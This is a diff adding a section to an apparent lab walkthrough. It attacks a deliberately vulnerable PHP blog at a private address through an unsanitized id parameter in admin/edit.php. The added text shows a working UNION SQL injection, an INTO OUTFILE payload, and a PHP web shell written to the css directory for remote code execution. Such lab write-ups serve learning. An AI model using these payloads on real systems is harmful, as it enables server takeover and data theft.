@@ -382,3 +382,136 @@ But for now we will just login by intercepting the request by burpsuite and chan
 
 Now that we have logged in as admin and we are at ```http://192.168.0.5/admin/index.php``` page so let's look into the source code of pages inside the ```admin``` directory one by one...
 
+We'll start with ```edit.php``` as this php file is used to edit the comments which could be directly in relation with backend mysql queries...
+
+**edit.php**
+
+```php
+<?php 
+  require("../classes/auth.php");
+  require("header.php");
+  require("../classes/db.php");
+  require("../classes/phpfix.php");
+  require("../classes/post.php");
+
+  $post = Post::find($_GET['id']);
+  if (isset($_POST['title'])) {
+    $post->update($_POST['title'], $_POST['text']);
+  } 
+?>
+  
+  <form action="edit.php?id=<?php echo htmlentities($_GET['id']);?>" method="POST" enctype="multipart/form-data">
+    Title: 
+    <input type="text" name="title" value="<?php echo htmlentities($post->title); ?>" /> <br/>
+    Text: 
+      <textarea name="text" cols="80" rows="5">
+        <?php echo htmlentities($post->text); ?>
+       </textarea><br/>
+
+    <input type="submit" name="Update" value="Update">
+
+  </form>
+
+<?php
+  require("footer.php");
+```
+So here we can see that ```find``` function is being used of ```classes/post.php```  to get the data from the mysql let's see the function code
+
+**find function**
+
+```php
+function find($id) { 
+    $result = mysql_query("SELECT * FROM posts where id=".$id);
+    $row = mysql_fetch_assoc($result); 
+    if (isset($row)){
+      $post = new Post($row['id'],$row['title'],$row['text'],$row['published']);
+    }
+    return $post;
+```
+
+Aha! here we can see that the user input(id) variable is being directly passed without any checks or validiation so there has to be a sql injection on this...Let's try :)
+
+<br/>
+<<selection 012>>
+<br/>
+
+```
+URL:-http://192.168.0.5/admin/edit.php?id=-1%20union%20select%201,%22we%20got%20it%20boys%22,3,4%23
+```
+Now we shall try to save files on the server (To be honest this part was just a hit and try because i didn't knew we have enough privs to save files..found out after trying)
+
+But before that we shall see the ```write``` permissions on the ```www``` directory 
+
+```
+root@debian:/var/www# ls -lha
+total 20K
+drwxr-xr-x  6 www-data www-data 210 Jan  2  2014 .
+drwxr-xr-x 19 root     root     140 Oct 10  2013 ..
+drwxr-xr-x  3 www-data www-data 164 Jan  2  2014 admin
+-rw-r--r--  1 www-data www-data 601 Oct 10  2013 all.php
+-rw-r--r--  1 www-data www-data 510 Oct 10  2013 cat.php
+drwxr-xr-x  2 www-data www-data 114 Jan  2  2014 classes
+drwxrwxrwx  2 www-data www-data  67 Jan  2  2014 css
+-rw-r--r--  1 www-data www-data 15K Oct 10  2013 favicon.ico
+-rw-r--r--  1 www-data www-data 185 Oct 10  2013 footer.php
+-rw-r--r--  1 www-data www-data 749 Oct 10  2013 header.php
+drwxrwxrwx  2 www-data www-data  30 Jan  2  2014 images
+-rw-r--r--  1 www-data www-data 369 Oct 10  2013 index.php
+-rw-r--r--  1 www-data www-data 243 Oct 10  2013 post_comment.php
+-rw-r--r--  1 www-data www-data 722 Oct 10  2013 post.php
+root@debian:/var/www# 
+```
+
+I can see 2 possible candidate directories **css and images**
+
+### Uploading shell
+
+So first we shall construct our basic payload to write a file in css directory...
+
+```
+Code:-union select 1,"hello sarthak",3,4 into outfile "/var/www/css/lol.php"%23
+```
+<br/>
+<<selection 013>>
+<br/>
+
+**OUTPUT**
+
+```
+root@debian:/var/www/css# ls
+base.css  default.css  style.css
+root@debian:/var/www/css# ls
+base.css  default.css  lol.php  style.css
+root@debian:/var/www/css# cat lol.php 
+1       hello sarthak   3       4
+root@debian:/var/www/css#
+```
+It is weird to see 1,3,4 to be written to the file but no problem we can work around it to create a php based shell...
+
+```
+PAYLOAD:-union select "<?php","system($_GET['c']);","?>",";" into outfile "/var/www/css/lol.php"%23
+```
+This would do our work hehe :)
+
+<br/>
+<<selection 014>>
+<br/>
+
+
+**OUTPUT**
+```
+root@debian:/var/www/css# ls
+base.css  default.css  style.css
+root@debian:/var/www/css# ls
+base.css  default.css  lol.php  style.css
+root@debian:/var/www/css# cat lol.php 
+<?php   system($_GET['c']);     ?>      ;
+root@debian:/var/www/css# 
+```
+
+### RCE achieved 
+
+<<selection 015>>
+<br/>
+
+And yes finally we got rce so let's try to update our script and automate everything upto shell...
